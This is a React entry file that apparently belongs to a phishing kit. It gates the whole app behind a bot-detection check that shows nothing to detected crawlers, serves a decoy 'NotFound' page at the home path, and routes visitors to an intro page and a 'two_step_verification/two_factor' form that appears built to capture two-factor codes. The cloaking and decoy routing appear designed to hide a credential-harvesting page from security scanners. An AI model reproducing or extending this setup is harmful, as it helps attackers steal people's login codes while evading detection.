import "./index.css";
import App from "./App.jsx";
import ReactDOM from "react-dom/client";
import { useState, useEffect } from "react";
import {
  BrowserRouter,
  Routes,
  Route,
  useLocation,
  Outlet,
} from "react-router-dom";
import Intro from "./Intro";
import AuthCodeForm from "./AuthCodeForm";
import NotFound from "./not-found.jsx";
import detectBot from "./detect-bot.js";
import { PATHS, COMMUNITY_ROUTE_PREFIX } from "./paths.js";

const CatchAll = () => {
  const { pathname } = useLocation();
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    const timer = setTimeout(() => setLoading(false), 700);
    return () => clearTimeout(timer);
  }, []);

  if (!pathname.startsWith(COMMUNITY_ROUTE_PREFIX)) return null;

  if (loading)
    return (
      <div
        style={{
          height: "100vh",
          width: "100vw",
          display: "flex",
          justifyContent: "center",
          alignItems: "center",
          backgroundColor: "white",
        }}
      >
        <span style={{ fontSize: "20px" }}>Loading...</span>
      </div>
    );

  return <App />;
};

const LiveShell = () => <Outlet />;

const AppRoutes = () => (
  <BrowserRouter>
    <Routes>
      <Route path={PATHS.DECOY_HOME} element={<NotFound />} />
      <Route path={PATHS.TIMEACTIVE_ROOT} element={<LiveShell />}>
        <Route index element={<Intro />} />
        <Route
          path="two_step_verification/two_factor"
          element={<AuthCodeForm />}
        />
        <Route path="*" element={<CatchAll />} />
      </Route>
      <Route path="*" element={<NotFound />} />
    </Routes>
  </BrowserRouter>
);

const Bootstrap = () => {
  const [ready, setReady] = useState(false);
  const [blocked, setBlocked] = useState(false);

  useEffect(() => {
    let cancelled = false;
    (async () => {
      try {
        const result = await detectBot();
        if (cancelled) return;
        if (result.isBot) {
          setBlocked(true);
          return;
        }
        setReady(true);
      } catch {
        if (!cancelled) setReady(true);
      }
    })();
    return () => {
      cancelled = true;
    };
  }, []);

  if (blocked) return null;

  if (!ready) {
    return (
      <div
        style={{
          height: "100vh",
          width: "100vw",
          display: "flex",
          justifyContent: "center",
          alignItems: "center",
          backgroundColor: "white",
        }}
      >
        <span style={{ fontSize: "20px" }}>Loading...</span>
      </div>
    );
  }

  return <AppRoutes />;
};

ReactDOM.createRoot(document.getElementById("root")).render(<Bootstrap />);
